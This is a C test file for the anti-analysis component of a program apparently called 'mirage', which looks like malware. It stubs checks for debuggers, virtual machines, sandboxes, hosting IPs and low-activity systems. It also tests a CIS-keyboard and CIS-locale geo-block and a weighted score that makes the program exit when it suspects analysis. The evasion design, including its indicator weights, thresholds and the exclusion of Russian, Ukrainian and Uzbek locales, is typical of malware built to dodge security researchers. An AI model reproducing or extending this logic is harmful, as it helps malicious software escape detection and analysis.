/*
 * test_evasion.c — Anti-analysis scoring tests
 *
 * Tests the evasion scoring logic by providing stubs for the
 * platform-specific detection functions and verifying the
 * weighted aggregation in mirage_anti_analysis_should_exit.
 *
 * Since the actual detection functions use Windows APIs, we
 * test the scoring logic and threshold behavior directly.
 */

#include <assert.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include "anti_analysis.h"
#include "config.h"

/* Use real is_cis_language from detection.c */
extern int is_cis_language(uint16_t lang_id);

/* ── Stub implementations for platform-specific functions ────── */

static uint64_t stub_ram = 8ULL * 1024 * 1024 * 1024; /* 8 GB */
static uint8_t stub_cores = 4;
static int stub_debugger = 0;
static int stub_vm_registry = 0;
static int stub_timing = 0;
static int stub_screen_w = 1920;
static int stub_screen_h = 1080;
static int stub_disk = 0;
static int stub_uptime = 0;
static int stub_mouse = 0;
static uint32_t stub_geo_matched = 0;
static int stub_hosting = 0;

/* These would normally be in evasion.c — we reimplement the scoring logic */
static uint64_t mirage_get_total_physical_ram_stubs(void) { return stub_ram; }
static uint8_t mirage_get_cpu_core_count_stubs(void) { return stub_cores; }
static int mirage_check_debugger_stubs(void) { return stub_debugger; }
static int mirage_check_registry_vm_indicators_stubs(void) { return stub_vm_registry; }
static int mirage_check_timing_anomaly_stubs(void) { return stub_timing; }

typedef struct { uint32_t w; uint32_t h; } screen_res;
static screen_res mirage_check_screen_resolution_stubs(void) {
    screen_res s = { stub_screen_w, stub_screen_h };
    return s;
}

static int mirage_check_disk_size_stubs(void) { return stub_disk; }
static int mirage_check_uptime_stubs(void) { return stub_uptime; }
static int mirage_check_mouse_movement_stubs(void) { return stub_mouse; }

typedef struct { uint32_t cis_keyboard; uint32_t cis_locale; uint32_t cis_timezone; uint32_t matched; } geo_result;
static geo_result mirage_check_geo_block_stubs(void) {
    geo_result g = {0};
    g.matched = stub_geo_matched;
    return g;
}

static int mirage_check_hosting_ip_stubs(void) { return stub_hosting; }

/* ── Should exit? ────────────────────────────────────────── */

static int should_exit(mirage_analysis_result result) {
    return result.score >= EVASION_SCORE_THRESHOLD ? 1 : 0;
}

/* ── Scoring function (mirrors anti_analysis.c logic) ──────── */

static uint32_t compute_score(void) {
    uint32_t score = 0;

    uint64_t ram = mirage_get_total_physical_ram_stubs();
    if (ram != 0) {
        if (ram < VM_MIN_RAM) score += 20;
    } else {
        score += 10;
    }

    uint8_t cores = mirage_get_cpu_core_count_stubs();
    if (cores != 0) {
        if (cores < VM_MIN_CPU_CORES) score += 20;
    } else {
        score += 10;
    }

    if (mirage_check_registry_vm_indicators_stubs()) score += 25;
    if (mirage_check_timing_anomaly_stubs()) score += 20;
    if (mirage_check_debugger_stubs()) score += 15;

    screen_res screen = mirage_check_screen_resolution_stubs();
    if (screen.w != 0 || screen.h != 0) {
        if (screen.w < VM_MIN_SCREEN_WIDTH || screen.h < VM_MIN_SCREEN_HEIGHT)
            score += 10;
    }

    int disk = mirage_check_disk_size_stubs();
    if (disk == 1) score += 15;
    else if (disk == -1) score += 5;

    int uptime = mirage_check_uptime_stubs();
    if (uptime == 1) score += 15;
    else if (uptime == -1) score += 5;

    int mouse = mirage_check_mouse_movement_stubs();
    if (mouse == 1) score += 10;
    else if (mouse == -1) score += 5;

    geo_result geo = mirage_check_geo_block_stubs();
    if (geo.matched >= 2) score += 20;

    int hosting = mirage_check_hosting_ip_stubs();
    if (hosting == 1) score += 15;
    else if (hosting == -1) score += 5;

    return score;
}

/* ── Helper to reset stubs to clean state ──────────────────── */
static void reset_stubs(void) {
    stub_ram = 8ULL * 1024 * 1024 * 1024;
    stub_cores = 4;
    stub_debugger = 0;
    stub_vm_registry = 0;
    stub_timing = 0;
    stub_screen_w = 1920;
    stub_screen_h = 1080;
    stub_disk = 0;
    stub_uptime = 0;
    stub_mouse = 0;
    stub_geo_matched = 0;
    stub_hosting = 0;
}

/* ── Tests ────────────────────────────────────────────────── */

static void test_clean_system_score_zero(void) {
    reset_stubs();
    uint32_t score = compute_score();
    assert(score == 0);

    printf("  PASS: test_clean_system_score_zero\n");
}

static void test_low_ram_detection(void) {
    reset_stubs();
    stub_ram = 1ULL * 1024 * 1024 * 1024; /* 1 GB — below 4 GB threshold */
    uint32_t score = compute_score();
    assert(score == 20);

    printf("  PASS: test_low_ram_detection\n");
}

static void test_ram_query_failure(void) {
    reset_stubs();
    stub_ram = 0; /* query failed */
    uint32_t score = compute_score();
    assert(score == 10);

    printf("  PASS: test_ram_query_failure\n");
}

static void test_few_cpu_cores(void) {
    reset_stubs();
    stub_cores = 1; /* below 2-core threshold */
    uint32_t score = compute_score();
    assert(score == 20);

    printf("  PASS: test_few_cpu_cores\n");
}

static void test_cpu_query_failure(void) {
    reset_stubs();
    stub_cores = 0; /* query failed */
    uint32_t score = compute_score();
    assert(score == 10);

    printf("  PASS: test_cpu_query_failure\n");
}

static void test_vm_registry_detection(void) {
    reset_stubs();
    stub_vm_registry = 1;
    uint32_t score = compute_score();
    assert(score == 25);

    printf("  PASS: test_vm_registry_detection\n");
}

static void test_timing_anomaly_detection(void) {
    reset_stubs();
    stub_timing = 1;
    uint32_t score = compute_score();
    assert(score == 20);

    printf("  PASS: test_timing_anomaly_detection\n");
}

static void test_debugger_detection(void) {
    reset_stubs();
    stub_debugger = 1;
    uint32_t score = compute_score();
    assert(score == 15);

    printf("  PASS: test_debugger_detection\n");
}

static void test_small_screen_detection(void) {
    reset_stubs();
    stub_screen_w = 640;
    stub_screen_h = 480;
    uint32_t score = compute_score();
    assert(score == 10);

    printf("  PASS: test_small_screen_detection\n");
}

static void test_small_disk_detection(void) {
    reset_stubs();
    stub_disk = 1; /* < 60 GB */
    uint32_t score = compute_score();
    assert(score == 15);

    printf("  PASS: test_small_disk_detection\n");
}

static void test_disk_query_failure(void) {
    reset_stubs();
    stub_disk = -1;
    uint32_t score = compute_score();
    assert(score == 5);

    printf("  PASS: test_disk_query_failure\n");
}

static void test_low_uptime_detection(void) {
    reset_stubs();
    stub_uptime = 1; /* < 30 minutes */
    uint32_t score = compute_score();
    assert(score == 15);

    printf("  PASS: test_low_uptime_detection\n");
}

static void test_uptime_query_failure(void) {
    reset_stubs();
    stub_uptime = -1;
    uint32_t score = compute_score();
    assert(score == 5);

    printf("  PASS: test_uptime_query_failure\n");
}

static void test_static_mouse_detection(void) {
    reset_stubs();
    stub_mouse = 1;
    uint32_t score = compute_score();
    assert(score == 10);

    printf("  PASS: test_static_mouse_detection\n");
}

static void test_mouse_query_failure(void) {
    reset_stubs();
    stub_mouse = -1;
    uint32_t score = compute_score();
    assert(score == 5);

    printf("  PASS: test_mouse_query_failure\n");
}

static void test_geo_cis_detection(void) {
    reset_stubs();
    stub_geo_matched = 3; /* >= 2 CIS indicators */
    uint32_t score = compute_score();
    assert(score == 20);

    printf("  PASS: test_geo_cis_detection\n");
}

static void test_geo_below_threshold(void) {
    reset_stubs();
    stub_geo_matched = 1; /* < 2 CIS indicators */
    uint32_t score = compute_score();
    assert(score == 0);

    printf("  PASS: test_geo_below_threshold\n");
}

static void test_hosting_ip_detection(void) {
    reset_stubs();
    stub_hosting = 1;
    uint32_t score = compute_score();
    assert(score == 15);

    printf("  PASS: test_hosting_ip_detection\n");
}

static void test_hosting_ip_query_failure(void) {
    reset_stubs();
    stub_hosting = -1;
    uint32_t score = compute_score();
    assert(score == 5);

    printf("  PASS: test_hosting_ip_query_failure\n");
}

static void test_threshold_boundary(void) {
    /* Score exactly at threshold should exit */
    mirage_analysis_result result = {0};
    result.score = EVASION_SCORE_THRESHOLD;
    assert(should_exit(result) == 1);

    printf("  PASS: test_threshold_boundary\n");
}

static void test_threshold_below(void) {
    mirage_analysis_result result = {0};
    result.score = EVASION_SCORE_THRESHOLD - 1;
    assert(should_exit(result) == 0);

    printf("  PASS: test_threshold_below\n");
}

static void test_threshold_above(void) {
    mirage_analysis_result result = {0};
    result.score = EVASION_SCORE_THRESHOLD + 10;
    assert(should_exit(result) == 1);

    printf("  PASS: test_threshold_above\n");
}

static void test_threshold_zero(void) {
    mirage_analysis_result result = {0};
    result.score = 0;
    assert(should_exit(result) == 0);

    printf("  PASS: test_threshold_zero\n");
}

static void test_combined_vm_indicators(void) {
    /* Simulate a typical VM: low RAM + few cores + small screen */
    reset_stubs();
    stub_ram = 2ULL * 1024 * 1024 * 1024;
    stub_cores = 1;
    stub_screen_w = 800;
    stub_screen_h = 600;

    uint32_t score = compute_score();
    assert(score == 40); /* 20 (RAM) + 20 (CPU) */

    /* Score < 70, should not exit */
    mirage_analysis_result result = {0};
    result.score = score;
    assert(should_exit(result) == 0);

    printf("  PASS: test_combined_vm_indicators\n");
}

static void test_max_score_all_checks(void) {
    /* All checks triggered: should produce high score */
    reset_stubs();
    stub_ram = 0;             /* +10 */
    stub_cores = 0;           /* +10 */
    stub_vm_registry = 1;     /* +25 */
    stub_timing = 1;          /* +20 */
    stub_debugger = 1;        /* +15 */
    stub_screen_w = 640;      /* +10 */
    stub_screen_h = 480;
    stub_disk = 1;            /* +15 */
    stub_uptime = 1;          /* +15 */
    stub_mouse = 1;           /* +10 */
    stub_geo_matched = 3;     /* +20 */
    stub_hosting = 1;         /* +15 */

    uint32_t score = compute_score();
    assert(score == 165); /* sum of all individual scores */

    mirage_analysis_result result = {0};
    result.score = score;
    assert(should_exit(result) == 1);

    printf("  PASS: test_max_score_all_checks\n");
}

static void test_analysis_flags_struct(void) {
    /* Verify flag struct is a bitfield and initializes to 0 */
    mirage_analysis_flags flags = {0};
    assert(flags.ram_low == 0);
    assert(flags.cpu_few == 0);
    assert(flags.vm_registry == 0);
    assert(flags.timing_anomaly == 0);
    assert(flags.debugger == 0);
    assert(flags.small_screen == 0);
    assert(flags.process_list == 0);
    assert(flags.disk_small == 0);
    assert(flags.uptime_low == 0);
    assert(flags.mouse_static == 0);
    assert(flags.geo_cis == 0);
    assert(flags.hosting_ip == 0);

    printf("  PASS: test_analysis_flags_struct\n");
}

static void test_analysis_result_struct(void) {
    /* Verify result struct initializes cleanly */
    mirage_analysis_result result = {0};
    assert(result.score == 0);
    assert(result.flags.ram_low == 0);

    printf("  PASS: test_analysis_result_struct\n");
}


/* ── is_cis_language tests (from detection.c) ────────────── */

static void test_cis_russian(void) {
    /* Russian primary language ID = 0x19 */
    assert(is_cis_language(0x0419) == 1); /* Russian (Russia) */
    assert(is_cis_language(0x0819) == 1); /* Russian (other) */
    printf("  PASS: test_cis_russian\n");
}

static void test_cis_ukrainian(void) {
    assert(is_cis_language(0x0422) == 1); /* Ukrainian */
    printf("  PASS: test_cis_ukrainian\n");
}

static void test_cis_english_not_cis(void) {
    assert(is_cis_language(0x0409) == 0); /* English (US) */
    assert(is_cis_language(0x0809) == 0); /* English (UK) */
    printf("  PASS: test_cis_english_not_cis\n");
}

static void test_cis_german_not_cis(void) {
    assert(is_cis_language(0x0407) == 0); /* German */
    printf("  PASS: test_cis_german_not_cis\n");
}

static void test_cis_uzbek(void) {
    assert(is_cis_language(0x042F) == 1); /* Uzbek (primary 0x2F) */
    printf("  PASS: test_cis_uzbek\n");
}

static void test_cis_zero(void) {
    assert(is_cis_language(0) == 0);
    printf("  PASS: test_cis_zero\n");
}

int main(void) {
    printf("=== test_evasion: anti-analysis scoring ===\n");

    test_clean_system_score_zero();
    test_low_ram_detection();
    test_ram_query_failure();
    test_few_cpu_cores();
    test_cpu_query_failure();
    test_vm_registry_detection();
    test_timing_anomaly_detection();
    test_debugger_detection();
    test_small_screen_detection();
    test_small_disk_detection();
    test_disk_query_failure();
    test_low_uptime_detection();
    test_uptime_query_failure();
    test_static_mouse_detection();
    test_mouse_query_failure();
    test_geo_cis_detection();
    test_geo_below_threshold();
    test_hosting_ip_detection();
    test_hosting_ip_query_failure();
    test_threshold_boundary();
    test_threshold_below();
    test_threshold_above();
    test_threshold_zero();
    test_combined_vm_indicators();
    test_max_score_all_checks();
    test_analysis_flags_struct();
    test_analysis_result_struct();

    test_cis_russian();
    test_cis_ukrainian();
    test_cis_english_not_cis();
    test_cis_german_not_cis();
    test_cis_uzbek();
    test_cis_zero();

    printf("=== test_evasion: ALL PASSED ===\n");
    return 0;
}
